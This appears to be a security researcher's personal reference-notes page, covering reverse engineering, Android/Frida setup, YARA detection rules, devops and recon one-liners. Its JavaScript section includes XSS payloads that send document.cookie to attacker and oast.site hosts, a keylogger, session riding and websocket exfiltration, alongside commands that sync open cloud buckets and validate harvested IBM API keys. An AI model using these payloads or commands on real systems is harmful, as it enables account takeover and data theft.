\u2502\u2502\u2502\u254e ; DATA XREF from sym.go.github.com_softlayer_softlayer_go_services.Network_Storage.RemoveAccessToReplicantFromVirtualGuestList @ 0x87837e -- \u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u254e 0x0043e2ed mov rax, qword [data.0126bd10] ; [0x126bd10:8]=0xc3f000 sym.go.main.main \u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u254e ; DATA XREF from sym.go.github.ibm.com_SoftLayer_softlayer_cli_plugin_managers.userManager.GetHardware @ 0xa09285 -- \u2502 \u2502\u2502 \u2502\u2502\u2502\u254e 0x0043e31d sub rsp, 0xffffffffffffff80 \u2502 \u2502\u2502 \u2502\u2502\u2502\u254e ; DATA XREF from sym.go.github.ibm.com_SoftLayer_softlayer_cli_plugin_managers.FindVolumePricesUpgrade @ 0x9ff258 [0x0043e060]> agc > /tmp/maincallgraph [0x0043e060]> afl |grep -i search|wc -l 51 ## Decided to scope over to the search features because that's the command line I used [0x004725e0]> db @@F ~softlayer_cli_plugin_commands_search https://github.com/miekg/dns/issues/1384 Dev Go plugins First off, you can't use regular elfs as go plugins. But, it seems, there isn't inherently a checker built into the plugins thing yet that prohibits all other elfs (https://cs.opensource.google/go/go/+/refs/tags/go1.24.2:src/plugin/plugin_dlopen.go;l=69) \u250c\u2500\u2500(root\u327fkp2323)-[/share/git-repo/Scripts/gotest/plugintest] \u2514\u2500# cat main.go|grep -i plugin \"plugin\" // Open the plugin plug, err := plugin.Open(\"../../../../../../../../../bin/bash\") log.Fatalf(\"Can't open plugin: %v\", err) // Call the function from the plugin // Access the variable from the plugin fmt.Println(\"Plugin Version:\", *versionVar) \u250c\u2500\u2500(root\u327fkp2323)-[/share/git-repo/Scripts/gotest/plugintest] \u2514\u2500# go run main.go 2025/05/01 15:05:05 Can't open plugin: plugin.Open(\"../../../../../../../../../bin/bash\"): /usr/bin/bash: cannot dynamically load position-independent executable exit status 1 nim docker compile docker run --rm -v `pwd`:/usr/local/src chrishellerappsian/docker-nim-cross:latest bash -c \"nimble install -y dnsclient; nim c --os:windows --cpu:amd64 --out:nsex.exe hello.nim\" related projects offensivenim nimcrypt2 nimplant nimpackt dinvoke -> nim_dinvoke nimfilt rust create txt request use trust_dns_resolver::error::ResolveResult; use trust_dns_resolver::Resolver; use trust_dns_resolver::{config::*, lookup::TxtLookup} fn main(){ let resolver = Resolver::new(ResolverConfig::default(), ResolverOpts::default()).unwrap(); let txt_respons = resolver.txt_lookup(\"whatever.whatever.tld\"); display_txt(&txt_response);_ } fn display_txt(txt_response: &ResolveResult<TxtLookup){ match txt_response{ Err(_)=>println!(\"No TXT Records\"), Ok(txt_response)=>{ let mut i = 1; for record in txt_response.iter(){ println!(\"TXT Record {}:\", i); println!(\"{}\" record.to_string()); println!(\"\"); i=i+1 } } } } base64 use base64::prelude::*; let input=b'whatever' let encoded=BASE64_STANDARD.encode(input); reading a file use std::env; use std::fs; fn main(){ println!(\"in file {file_path}\"); let contents=fs::read_to_string(file_path).expect(\"you should have been able to read the file!); println!(\"With text:\\n{contents}\") } home dir usr std::env; match env::home_dir(){ Some(path)=>println!(\"your home directory {}\", path.display()), None=>println!(\"impossible to get your home dir\"), } pyscript Just some testing, to understand it <div w3-include-html=\"https://ferasdour.pyscriptapps.com/silent-math/latest/?url=https://ffpi86cvy1zmtg0bs49m3ki72w1t4pbc9.oast.site\"></div> <script src='https://ferasdour.pyscriptapps.com/silent-math/latest/whatever.js'></script> <img src=\"xsspoc\" onerror=\"import('https://ferasdour.pyscriptapps.com/evil-poc-dont-use/latest/whatever.js');\"> More info on this is over here: https://pyscript.com/@ferasdour/evil-poc-dont-use/latest?files=README.md , https://github.com/ferasdour/other-nonsense , and https://feemcotech.blogspot.com/2025/05/pyscript-nim-aaaaand-go.html Quick devops spinup mkdir /volume1/Data/jenkins docker run -p 10080:8080 -v /volume1/Data/jenkins:/var/jenkins_home jenkins/jenkins:lts mkdir /volume1/Data/gogs docker run --name=gogs -p 10022:22 -p 10880:3000 -v /var/gogs:/data gogs/gogs Android Install from apk PS C:\\Users\\no_ne\\Desktop> ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb.exe install metaview.apk Install CA openssl x509 -inform PEM -subject_hash_old -in ca-docker.crt|head -n 1 ce01745e openssl x509 -in ca-docker.crt -inform PEM -outform DER -out ce01745e.0 # on adb system ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb.exe push .\\certs\\ce01745e.0 /data/misc/user/0/cacerts-added/ce01745e.0 ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"su 0 chmod 644 /data/misc/user/0/cacerts-added/ce01745e.0\" ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb reboot Install Frida unxz frida-server.xz adb root ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb push .\\frida-server-16.6.6-android-x86_64 /data/local/tmp/ ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"chmod 755 /data/local/tmp/frida-server-16.6.6-android-x86_64 ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"chmod 755 /data/local/tmp/frida-server-16.6.6-android-x86_64\" ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"/data/local/tmp/frida-server-16.6.6-android-x86_64 &\" Adb networked taskkill /f /t /im adb.exe .\\adb.exe -a nodaemon server javascript (mostly from tcm's course) notes apis: - requests: - fetch - fetch(\"https://google.com\") - xmlhttp - let xhr = new XMLHttpRequest(); xrh.open('GET','https://google.com',true); xhr.send('email=update@email.com') Stealing Cookies: <img src=\"http://10.10.14.13?c='+document.cookie+'\"/> <img src=x onerror='fetch(\"http://cvo169ukuj238mr1ikegi59khk1ww9rzc.oast.site/?auth=\"+document.cookie)';/> fetch(\"http://locahost/?c=\"+document.cookie); Accessing storage: let localStorageData=JSON.stringify(localStorage) let sessionStorageData=JSON.stringify(sessionStorage) Saved Creds (autofill and export): // create the input elements let userField=document.createElement('input'); userField.Type=\"text\"; UserField.name=\"username\"; UserField.id=\"username\"; let passField = document.createElement('input'); passField.type=\"password\"; passField.name=\"password\"; passField.id=\"password\"; // append the elements tot he body of the page document.body.appendChild(userField); document.body.appendChild(passField); // exfiltrate as needed setTimeout(function(){ console.log(\"Username:\", document.getElementById(\"username\").value); console.log(\"Username:\", document.getElementById(\"username\").value); }, 1000); Session Riding: let xhr = new XMLHttpRequest(); xhr.open('POST','http://localhost/updateprofile',true); xhr.setRequestHeader('Content-type'.'application/x-www-form-urlencoded'); xhr.send('?email=update@email.com'); Keylogger: document.onkeypress=function(e){ get=window.event ? event: e; key=get.keyCode ? get.keyCode : get.charCode; key=String.fromCharCode(key); console.log(key); } example using this to get admin: <script>fetch('https://10.10.14.13/',{method: 'POST', mode: 'no-cors', body: document.cookie,});</script> Websocket example: <script> var ws=new Websocket('wss://target.local/page'); ws.onopen=function(){ws.send(\"READY\");} ws.onmessage=function (event) {fetch('https://colab-payload.local',{method:\"POST\",mode:\"no-cors\",body:event.data});} </script> Port scanning (defanged example): const listing=[];listing.forEach((domain) => {Array.from([\"80\",\"8080\",\"443\",\"8443\",\"10000\",\"22\",\"2222\",\"88\",\"5789\"]).forEach(port => {try{fetch('http://'+domain+':'+port,{method: 'POST', mode: 'no-cors',body: document.cookie,}).then(data => {obj = data;});fetch('WHATEVER',{method: 'POST', mode: 'no-cors', body: obj,}); new Promise(r => setTimeout(r, 2000));} catch(error){}});}); launch powershell web opening folders with explorer but choosing powershell, lauches powershell . old ways https://devblogs.microsoft.com/scripting/how-can-i-start-windows-explorer-opened-to-a-specific-folder/ Maybe - objShell.BrowseForFolder _ (WINDOW_HANDLE, \u201cSelect a folder:\u201d, NO_OPTIONS, \"powershell -iex 'start cmd.exe'\") . https://learn.microsoft.com/en-us/windows/win32/shell/shell-browseforfolder (activex objects in javascript don't work anymore except for ie and such so might have to rely on vbs or wasm) . This has apparently been a thing for a while https://stackoverflow.com/questions/33746534/vbscript-open-folder-in-same-explorer-window . Here's an example where they also add to make it send enter to forward it: Set WshShell = WScript.CreateObject(\"WScript.Shell\") target = \"powershell -iex 'start cmd.exe'\" WshShell.SendKeys \"%d\" WshShell.SendKeys target WshShell.SendKeys \"{ENTER}\" . remote share by specifically launching wscript.shell.run: Set WshShell = WScript.CreateObject(\"WScript.Shell\") WshShell.Run \"Explorer \" & \"\\\\MachineName\\Path\\\", 1, false wscript.Sleep 10000 WshShell.Run \"Explorer \" & \"C:\\Users\\UserName\\Desktop\", 1, false . None of those work outside of ie context, or some cases with edge (chromium) . https://developer.mozilla.org/en-US/docs/Web/API/Navigator/share#examples web share api seems to have a file option . https://developer.mozilla.org/en-US/docs/Web/API/File/File . example (unrelated) of file use const file = new File([\"https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online\"], \"foo.lnk\", {type: \"text/uri-list\",}); await navigator.share({file, title: \"test\", text: \"test\", url: ''}); await navigator.share({title: 'test',text: 'test',url: 'https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online',}); # click the button by default document.getElementsByTagName('button')[0].click(); # example javascript let shareData = { title: 'MDN', text: 'Learn web development on MDN!', url: 'https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online', }; const btn = document.querySelector('button'); const resultPara = document.querySelector('.result'); btn.addEventListener('click', () => { if (!navigator.canShare) { resultPara.textContent = 'Web Share API not available'; return; } if (!navigator.canShare(shareData)) { resultPara.textContent = 'Share data unsupported, disallowed, or invalid'; return; } Detection phishing kits yara rule (found inside open buckets) rule phishingKits3 { meta: description = \"PhishingKits3\" author = \"ferasdour\" strings: $s1 = \"https://ajax.googleapis.com/ajax/libs/jquery/\" ascii $s2 = \"https://code.jquery.com/jquery-\" ascii $s3 = \"window.location.hash.substr(\" ascii $s4 = \".substr((\" ascii $s5 = \").click(function(event\" ascii $s6 = \"Please try again later\" ascii $r1 = /url:(\\s)\\Shttps:\\/\\/.[a-zA-Z0-9-_.]{6,200}/is $r2 = /type:(\\s|\\s')POST',/is $s7 = \"email:\" ascii $s8 = \"password:\" ascii $s9 = \"btn').html('\" ascii // $header = { (0d 0a | 20 0d 0a 0d 0a | 3c 21 44) } condition: any of ($*) } IBM Cloud API key yara rule (finds some false positives, but substantially less than any other method I've found) rule cloudApiKeyRule { meta: name = \"ibmcloud key\" author = \"ferasdour\" notes = \"just used grep -Praho with these set together with or operator\" strings: $ibmApiKey = /\\\"[A-Za-z0-9]{5,25}\\d[A-Za-z0-9]{5,20}[\\_][A-Za-z0-9]{5,25}\\\"/ $ibmApiKey2 = /(\\s[A-Za-z0-9]{5,25}\\d[A-Za-z0-9]{5,20}[\\_][A-Za-z0-9]{5,25})/ $ibmApiKey3 = /([A-Za-z0-9]{5,25}\\d[A-Za-z0-9]{5,20}[\\_][A-Za-z0-9]{5,25})/ condition: // I have keys that are both 44 and 63 chars, truffle detects the 44 char, and terraform says its 63 limit, so lets just assume both. 46 to accomodate the quoted version ($ibmApiKey and (!ibmApiKey == 46 or !ibmApiKey == 64)) or ($ibmApiKey2 and (!ibmApiKey2 == 44 or !ibmApiKey2 == 63)) or // adding this one as a \"with nothing added or surrounding the detection\" for binary cases, comment out if not needed. ($ibmApiKey3 and (!ibmApiKey3 == 44 or !ibmApiKey3 == 63)) } IBMCloud cli config file rule ibmcloudconfig: CLOUD_CONFIG_FILE { meta: description = \"Search specifically for bearer token left in file from ibmcloud cli, including plugins\" author = \"ferasdour\" strings: $s1 = \"IAMToken\" $s2 = \"IAMRefreshToken\" $s3 = \"cloud.ibm.com\" $h1 = { 7b 0a 20 20 } condition: $h1 at 0 and all of ($s1, $s2, $s3)","title":"Reference"},{"location":"Stuff/reference/#commands-for-various-things","text":"","title":"Commands for various things:"},{"location":"Stuff/reference/#virtual-environment-management","text":"","title":"virtual environment &amp; management"},{"location":"Stuff/reference/#virt-os-level","text":"","title":"Virt os level"},{"location":"Stuff/reference/#upgrade-everything","text":"for i in `seq 1 3`; do apt update; apt upgrade -y; service snapd start; snap refresh; flatpak update -y; pip --disable-pip-version-check list --outdated --format=json | python -c \"import json, sys; print('\\n'.join([x['name'] for x in json.load(sys.stdin)]))\" | xargs -n1 pip install -U --break-system-packages --root-user-action=ignore; pipx upgrade-all; npm update -g; /root/go/bin/pdtm -ia; /root/go/bin/pdtm -ua; rustup update; for c in `cargo install --list|cut -sd' ' -f1`; do cargo install $c; done; done","title":"Upgrade everything"},{"location":"Stuff/reference/#find-domains-that-resolve-to-local-ips","text":"subfinder -rl 50 -all -silent -d lb.appdomain.cloud > /tmp/subdomains; for i in `cat /tmp/subdomains`; do dig +all $i |grep -i \"IN A\\|DIG \"| grep -B1 -iE \"(192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.1[6789]\\.\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.2[0-9]\\.|172\\.3[01]\\.\\.[0-9]{1,3}\\.[0-9]{1,3})\"; done |grep -i \"+all\" |awk '{print $7}'","title":"Find domains that resolve to local ips"},{"location":"Stuff/reference/#merge-json-files","text":"jq -s '.[0] * .[1]' test2.json counts.json > test1.json","title":"merge json files"},{"location":"Stuff/reference/#added-memory-because-memory","text":"dd if=/dev/zero of=/swapfile bs=1GB count=40 mkswap /swapfile swapon /swapfile","title":"Added memory because memory"},{"location":"Stuff/reference/#better-ip-output","text":"ip -br -c a","title":"better ip output"},{"location":"Stuff/reference/#host-level","text":"","title":"Host level"},{"location":"Stuff/reference/#start-local-python-server-to-pull-isos-instead-of-from-other-location","text":"tmux new-session -s webserver -d \"python3 -m http.server --directory=/share/vms/\"","title":"Start local python server (to pull isos, instead of from other location)"},{"location":"Stuff/reference/#create-vm","text":"papermill /automation-tools/libvirt-provision.ipynb /dev/stdout -p hostname ubuntu -p domainname private -p url http://10.42.0.1:8000/noble-server-cloudimg-amd64.img -p os_variant ubuntu-stable-latest -p size 40G -p ram 2048","title":"Create VM"},{"location":"Stuff/reference/#power-on-all-stopped-vms","text":"for i in `virsh list --all|grep -i off|awk '{print $2}'`; do virsh start $i; done","title":"Power on all stopped vms"},{"location":"Stuff/reference/#stop-and-remove-all-vms","text":"for i in `virsh list --all|grep -i .private|awk '{print $2}'`; do tmux new-session -d \"virsh destroy $i; sleep 300; virsh undefine $i --remove-all-storage\"; done 2>/dev/null","title":"Stop and remove all vms"},{"location":"Stuff/reference/#start-local-python-server-to-pull-isos-instead-of-from-other-location_1","text":"tmux new-session -s webserver -d \"python3 -m http.server --directory=/share/vms/images\"","title":"Start local python server (to pull isos, instead of from other location)"},{"location":"Stuff/reference/#site-update","text":"git add *; date=`date`; git commit -m \"$date\"; git branch -M main; git remote add origin git@github.com:ferasdour/ferasdour.github.io.git; git push origin main; mkdocs gh-deploy --force","title":"Site update"},{"location":"Stuff/reference/#deb-repo","text":"cp -R /var/cache/apt/archives/* /share/vms/images/debs/ dpkg-scanpackages /share/vms/images/debs/ /dev/null | gzip -9c > /share/vms/images/debs/Packages.gz","title":"deb repo"},{"location":"Stuff/reference/#uptime-check-network-validation","text":"nmap -sS -p22 --open -Pn -n `ip address show dev $(virsh net-info default|grep -i bridge |awk '{print $2}')|grep -i inet|awk '{print $2}'`|grep -i \"report for\" |awk '{print $5}' > /tmp/virtnmap; for i in `cat /tmp/virtnmap`; do ssh-keyscan -H $i > ~/.ssh/known_hosts 2>/dev/null; ansible $i -i /tmp/virtnmap -a \"uptime\" -T 30 -u ansible -b; done","title":"uptime check &amp; network validation"},{"location":"Stuff/reference/#watch-vm-lists","text":"watch \"echo '\\nTMUX SESSIONS:\\n';tmux list-sessions; echo '\\nVMS:\\n'; virsh list --all|grep -i private; echo '\\nIP ADDRESSES:\\n'; virsh net-dhcp-leases default|grep -owE '[0-9.]{7,20}'\"","title":"Watch vm lists"},{"location":"Stuff/reference/#nmcli-hotspot","text":"nmcli dev wifi hotspot ifname wlan1 ssid testmeta password metatest nmcli con add type ethernet ifname eth0 ipv4.method shared con-name \"internetShare\"","title":"nmcli hotspot"},{"location":"Stuff/reference/#nmcli-connection-modify","text":"nmcli connection modify \"MyConnection\" connection.interface-name eth0","title":"nmcli connection modify"},{"location":"Stuff/reference/#pentesting-forensics","text":"","title":"pentesting &amp; forensics"},{"location":"Stuff/reference/#repolist-for-fun-and-profit","text":"for each in `curl -s -L https://api.github.com/orgs/$ORG/repos |jq \".[]|.html_url\"|sed s/'\"'//g`; do repolist -u $each|sed s/\"\\/\"/\"\\n\"/g; done |sort -u >> wordlist","title":"repolist for fun and profit"},{"location":"Stuff/reference/#bounty-targets","text":"git clone https://github.com/arkadiyt/bounty-targets-data pdtm -ia; pdtm -ua; for i in `grep -Eoh \"(([a-zA-Z](-?[a-zA-Z0-9])*)\\.)+[a-zA-Z]{2,}\" bounty-targets-data/data/*.txt|sort -u`; do subfinder -max-time 100 -silent -recursive -active -d $i |katana -hl -silent -nos -xhr -d 50 -jc -jsl -kf -ns -H \"User-agent: \" >> scrape-$i-log; done for i in `sort -u bounty-targets-data/data/domains.txt|grep -iE \".{3,}\" `; do echo `docker run -it --rm -v $PWD/:/app/results waymore:latest waymore -i $i -oU $i.links -oR /app/results/$i/`; done awk -F \",\" '{print $2}' */waymore_index.txt|awk -F \"//\" '{$1=$2=\"\"; print $0}'|sed s/\" \"/\"\\/\"/g|sed s/\"\\/\\/\"//g|sed s/\"\\/$\"//g|sort -u grep -hEo \"(http|https)://[a-zA-Z0-9./?=_%:-]*\" scrape-*-log|sed s/\"%5C$\"//g|sed s/\"%5C%5C$\"//g|sort -u","title":"Bounty Targets"},{"location":"Stuff/reference/#javascript-deobfuscate","text":"docker run -d --rm --name jsdetox -p 3000:3000 docker.io/remnux/jsdetox docker run -d --rm -p 4000:4000 -p 35729:35729 --name docker.io/de4js remnux/de4js https://tungcsv.github.io/de4js/","title":"Javascript Deobfuscate"},{"location":"Stuff/reference/#run-beacon-heatmap-all-interfaces","text":"for i in `iw dev|grep -i interface|awk '{print $2}'`; do ifconfig $i down; iwconfig $i mode monitor; ifconfig $i up; tmux new-session -s heatmap-$i -d \"cd /share/git-repo/scapy-monitor; python3 beacon-heatmap.py --iface $i -m 0 --db test-$i.json\"; done #then to view: jq -s '.[0] * .[1]' test*.json > counts.json; python3 beacon-heatmap.py --nopcap --mac 5e:00:f1:50:23:fe --db counts.json; ristretto heatmap.png &","title":"run beacon-heatmap all interfaces"},{"location":"Stuff/reference/#afl-such","text":"had to note this somewhere, dumb fuzzing, smart parameter finding: llm prompt: generate 1000 possible command options for the linux command \"apython\". This is to be used as input for a fuzzer, so no need for explainations or usage, just give command arguments Ok, I'm ready to generate 1000 possible command options for \"apython\" to be used as input for a fuzzer. I'll focus on providing diverse command arguments without explanations or usage examples. Here are 1000 possible command options for \"apython\": 1. apython -h ... to fix that a little and create the required input files: n=1;for each in `sed s/\"^[0-9a-zA-Z.]* apython \"/\"\"/g /tmp/test/inputlist`; do echo $each >> input/$n; n=$(($n+1)); done afl-fuzz -m none -i input -o output -n -- /bin/apython -a @@ another example: https://gist.github.com/ferasdour/783a1bdb383e1f2f9d26adf97353b7ee n=1; for each in `sed s/\"^[0-9a-zA-Z.]* \"/\"\"/g list|grep -iv \"#\"|sort -u`; do echo $each >> input/$n; n=$(($n+1)); done > ls inputafl-fuzz -i input -o output -n -D -- ./dnscapture -a @@","title":"afl &amp; such"},{"location":"Stuff/reference/#jwt","text":"docker run -it --network \"host\" --rm -v \"${PWD}:/tmp\" -v \"${HOME}/.jwt_tool:/root/.jwt_tool\" docker.io/ticarpi/jwt_tool","title":"JWT"},{"location":"Stuff/reference/#binwalk-extract-everything","text":"binwalk --dd='.*' --run-as=root /root/resources.arsc","title":"Binwalk extract everything"},{"location":"Stuff/reference/#bucket-search-aws","text":"aws s3 ls --no-sign-request --recursive s3://cf-courses-data/ --endpoint-url=https://s3.us.cloud-object-storage.appdomain.cloud aws s3 sync --no-sign-request --recursive s3://cf-courses-data/ --endpoint-url=https://s3.us.cloud-object-storage.appdomain.cloud . aws configure --profile whatever aws s3 ls s3://whatever --profile whatever","title":"Bucket Search AWS"},{"location":"Stuff/reference/#firebase-enum","text":"git clone https://github.com/Sambal0x/firebaseEnum ./firebaseenum.py -k searchterm","title":"firebase enum"},{"location":"Stuff/reference/#smtp-server","text":"python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25","title":"smtp server"},{"location":"Stuff/reference/#iptables-for-zapburp","text":"iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080; iptables -t nat -I PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080;","title":"Iptables for zap/burp"},{"location":"Stuff/reference/#run-initial-scan","text":"/share/public-git-repos/automation-tools/sanitize.sh; papermill --stdout-file /tmp/initial-scan.output /share/public-git-repos/automation-tools/initial-scans.ipynb /tmp/initial-scan.json -p input_data 10.13.37.14","title":"Run initial scan"},{"location":"Stuff/reference/#caido-docker","text":"podman run --rm -p 8080:8080 --userns=keep-id -v /caido:/home/caido/.local/share/caido -m 2g --memory-swap 2g docker.io/caido/caido:latest","title":"Caido Docker"},{"location":"Stuff/reference/#unknown-ciphers-encryption","text":"podman run -it --rm docker.io/remnux/ciphey {text}","title":"unknown ciphers / encryption:"},{"location":"Stuff/reference/#chrome-driver-with-listening-port","text":"tmux new-session -d \"chromedriver --port=4444 --disable-dev-shm-usage\"","title":"chrome driver with listening port"},{"location":"Stuff/reference/#scan-for-and-validate-ibmcloud-apikeys-bash-version","text":"for apikey in `grep -iroEh \"([a-zA-Z0-9]{28,40}[_-][a-zA-Z0-9]{4,15})\" /tmp/truffle* 2>/dev/null`; do token=`curl https://iam.cloud.ibm.com/identity/token -X POST -d \"apikey=$apikey&grant_type=urn%3Aibm%3Aparams%3Aoauth%3Agrant-type%3Aapikey&response_type=cloud_iam\" -s|grep -i access_token|awk -F '\"' '{print $4}'`; curl -s -X GET https://iam.cloud.ibm.com/v1/apikeys -H \"Authorization: Bearer $token\"|jq '.apikeys[]|.id' 2>/dev/null; done","title":"scan for and validate ibmcloud apikeys (bash version)"},{"location":"Stuff/reference/#api-testing","text":"github.com/yogsec/API-Pentesting-Tools","title":"API Testing"},{"location":"Stuff/reference/#buckets-by-provider","text":"ibm: s3.(region).cloud-object-storage.appdomain.cloud aws: s3.amazonaws.com digitalocean: (region).digitaloceanspaces.com google: storage.googleapis.com","title":"Buckets by provider:"},{"location":"Stuff/reference/#exfil-open-buckets","text":"domain=s3domain; /root/.pdtm/go/bin/pdtm -ia; /root/.pdtm/go/bin/pdtm -ua ;for i in `subfinder -max-time 100 -silent -recursive -d $domain |awk -F \"\\.$domain\" '{print $1}' |sort -u`; do mkdir $i && cd $i && aws s3 sync --no-sign-request s3://$i/ --endpoint-url=https://$domain . ; cd /share/pentests/bugbounty/ibm/alternative-bucket/yetanother/; done; find . -type d -empty -delete","title":"Exfil open buckets"},{"location":"Stuff/reference/#pixelation","text":"python3 depix.py \\ -p /path/to/your/input/image.png \\ -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \\ -o /path/to/your/output.png","title":"pixelation"},{"location":"Stuff/reference/#wpscan","text":"wpscan --rua --plugins-detection aggressive --plugins-version-detection aggressive -e ap,u,dbe,at,cb --proxy http://192.168.56.1:8080 --detection-mode aggressive --disable-tls-checks --throttle 1 --headers \"X-HackerOne-Research: ferasdour\" --url replaceme","title":"wpscan"},{"location":"Stuff/reference/#kerb-local-to-domain-creds","text":"https://www.linkedin.com/posts/giulio-pierantoni-036792178_are-you-the-local-admin-of-a-domain-host-activity-7338264538112319490-APYu?utm_source=share&utm_medium=member_desktop&rcm=ACoAACAshRgBOHjgq-VF9tt2qFKLuENiNbPHCY8 ksetup /setcomputerpassword <abcd>","title":"kerb local to domain creds"},{"location":"Stuff/reference/#initial-scan-ffuf","text":"ffuf -u $URL/FUZZ -w /share/Wordlists/webcontent-top-10000.txt -recursion -raw -fc 404,403,400,500 -e .php,.html,.bac,.bak,.txt,.csv,.backup,.vim,.sql -fs 14 -v |grep -oP '(htt.*)'","title":"Initial scan ffuf"},{"location":"Stuff/reference/#ansible","text":"","title":"Ansible"},{"location":"Stuff/reference/#password-change-without-exposing-password-to-process-list-on-ansible-managed-node","text":"ansible-playbook -i localhost, ../othertools/ansible/change-shadow.yaml -u ansible -b --become-password-file /root/becomefile -e user=root -e \"pass=$(openssl passwd -6 passwd)\"","title":"password change without exposing password to process list on ansible managed node"},{"location":"Stuff/reference/#run-keycloak","text":"mkdir /volume1/Data/keycloak; docker run --name keycloak -v /volume1/Data/keycloak:/opt/keycloak -p 8080:8080 -e KC_BOOTSTRAP_ADMIN_USERNAME=user -e KC_BOOTSTRAP_ADMIN_PASSWORD=password quay.io/keycloak/keycloak:26.1.3 start-dev","title":"Run keycloak"},{"location":"Stuff/reference/#run-jenkins-gogs","text":"ansible-playbook -i storage, ../../Notes/Obsidian/RandomDocs/RandomDocs/Ansible/Ansible-Docker-devops/jenkins-gogs.yml -u user -e ansible_python_interpreter=/bin/python -K","title":"Run jenkins &amp; gogs"},{"location":"Stuff/reference/#jenkins-gogsyml","text":"--- - hosts: all gather_facts: yes become: yes vars: ansible_host_key_checking: false ansible_ssh_timeout: 300 tasks: - name: Create jenkins dir ansible.builtin.file: path: /volume1/Data/jenkins state: directory mode: '777' - name: Create gogs dir ansible.builtin.file: path: /volume1/Data/gogs state: directory mode: '777' - name: start jenkins ansible.builtin.command: cmd: /usr/local/bin/docker run --name jenkins-dev --rm -p 7080:8080 -v /volume1/Data/jenkins:/var/jenkins_home jenkins/jenkins:lts async: 30 poll: 0 register: jenkinstask - name: start gogs ansible.builtin.command: cmd: /usr/local/bin/docker run --rm --name gogs -p 7022:22 -p 10880:3000 -v /volume1/Data/gogs:/data gogs/gogs async: 30 poll: 0 register: gogstask - name: wait for jenkins task ansible.builtin.async_status: jid: \"{{ jenkinstask.ansible_job_id }}\" until: job_result.finished register: job_result retries: 300 delay: 300 - name: wait for gogs task ansible.builtin.async_status: jid: \"{{ gogstask.ansible_job_id }}\" until: job_result.finished register: job_result retries: 300 delay: 300 - name: start get jenkins password ansible.builtin.command: cmd: /usr/local/bin/docker exec jenkins-dev cat /var/jenkins_home/secrets/initialAdminPassword register: jenkinsPass - name: print pass debug: msg: \"{{ jenkinsPass.stdout }}\"","title":"jenkins-gogs.yml"},{"location":"Stuff/reference/#run-homepage","text":"docker run -p 3333:3333 -e HOMEPAGE_ALLOWED_HOSTS=familystorage -v /volume1/Data/homepage:/app/config -v /var/run/docker.sock:/var/run/docker.sock ghcr.io/gethomepage/homepage:latest","title":"Run homepage"},{"location":"Stuff/reference/#nmap-invyml","text":"--- plugin: community.general.nmap strict: false ipv4: true ports: true sudo: true port: 22,80,8080,443,8443 address: 172.18.0.1/24 groups: ssh_server: \"ports | selectattr('service', 'equalto', 'ssh')\" web_servers: \"ports | selectattr('service', 'equalto', 'http'\"","title":"nmap-inv.yml"},{"location":"Stuff/reference/#reversing-things","text":"Find main based on last ret to libc look for libc startup -> find last call made that returns something to eax -> that's main, in libc stuff. shellcode quick analysis scdbg /f out.bin -s -1 (parse all from out.bin) Choco: choco upgrade all -y -force choco list --local-only choco install PACKAGENAME -y choco install packer vagrant virtualbox git poshgit chefdk visualstudiocode -y choco install github --ignore-checksums choco outdated","title":"Reversing things"},{"location":"Stuff/reference/#rizin","text":"","title":"Rizin"},{"location":"Stuff/reference/#helpful-stuff","text":"dso; drr; pd 10 # ds = debug step, dso = debug step over, dr is debug register, drr is debug register with additional context, pd is print dump with a specifer (10) of how many steps to print in the disassembler # Information about the binary file > i # All summary > ia # Show main address > iM # Symbols is # List strings > iz # List strings in whole binary > izz # Reopen current file in debug mode > ood # Disassemble at current address > pd # Disassemble 10 instructions at current address > pd 10 # Disassemble all possible opcodes at current address > pda # Disassemble all possible opcodes 10 instructions at current address > pda 10 # Disassemble at the given function > pd @ main > pd 20 @ main # Disassemble a function at current address > pdf # Disassemble at given address > pdf @ 0x401005 # Disassemble the main function > pdf @ main # Print string > ps @ 0x2100 # Print zero-terminated string > psz @0x2100 # Show 200 hex bytes > px 200 # Show hex bytes at given register > px @ eip > px @ esp # Print current address > s # Seek to given function > s main > s sym.main # Seek to given address > s 0x1360 > s 0x0x00001360 # Seek to register address > s esp > s esp+0x40 > s rsp > s rsp+0x40 # Seek 8 positions > sd 8 # Show the seek history > sh # Undoing > shu # Redoing > shr # Step > ds # Step 3 times > ds 3 # Step back > dsb # Setup a breakpoint > db @ 0x8048920 # Remove a breakpoint > db @ -0x8048920 # Remove all breakpoints > db-* # List all breakpoints > dbl # Continue to execute the program until we hit the breakpoint > dc # Continue until syscall > dcs # Read all registers values > dr > dr= # Read given register value > dr eip > dr rip # Set a register value > dr eax=24 # Show register references > drr # Analyze all calls > aaa # Analyze function > af # List all functions > afl > afl | grep main # Show address of current function > afo","title":"helpful stuff"},{"location":"Stuff/reference/#running-1","text":"[0x7ffad20914d0]> afl |findstr Main 0x004014d0 1 34 dbg.WinMainCRTStartup 0x00435a21 1 45 sym.PreMainInner 0x00435a4e 1 109 sym.PreMain 0x00435abb 1 20 sym.NimMainInner 0x00435acf 1 49 sym.NimMain 0x00435b55 34 1480 sym.NimMainModule [0x7ffad20914d0]> db @ 0x00435b55 [0x7ffad20914d0]> dc #initial startup [0x7ffad20fc47a]> dbl # list breakpoints start end size perm hwsw type state valid cmd cond name module ------------------------------------------------------------------------------------------- 0x00435b55 0x00435b56 1 --x sw break enabled valid sym.NimMainModule [0x7ffad20fc47a]> dc # continue until break point hit breakpoint at: 0x435b55 # just before break point ?? [0x00435b55]> afl |findstr dns 0x00429635 16 2826 sym.dnsclient_typesDatInit000 